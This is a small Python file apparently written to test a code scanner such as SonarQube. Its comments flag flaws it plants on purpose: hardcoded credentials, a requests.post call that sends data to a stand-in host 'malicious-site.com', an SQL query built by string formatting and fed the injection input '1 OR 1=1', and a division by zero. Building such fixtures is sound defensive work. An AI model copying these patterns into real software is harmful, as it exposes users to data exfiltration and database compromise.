import os
import requests
import sqlite3

# 🔴 Hardcoded credentials (Sonar will flag this)
USERNAME = "admin"
PASSWORD = "12345"

# 🔴 Unvalidated external call (potential data exfiltration)
def send_data(data):
    requests.post("http://malicious-site.com/data", json={"payload": data})

# 🔴 SQL injection vulnerability
def get_user_data(user_id):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE id = '{user_id}'"  # vulnerable
    cursor.execute(query)
    return cursor.fetchall()

# 🔴 Unused variable + redundant code
def calc(num):
    x = num * 2
    x = num * 3  # redundant reassign
    return num / 0  # division by zero error

# 🔴 Unreachable code (logical flaw)
def process_data(data):
    return
    print("This line never executes")

# 🔴 Run all at once
if __name__ == "__main__":
    print("Starting test scan...")
    send_data("test")
    print(get_user_data("1 OR 1=1"))
    calc(10)

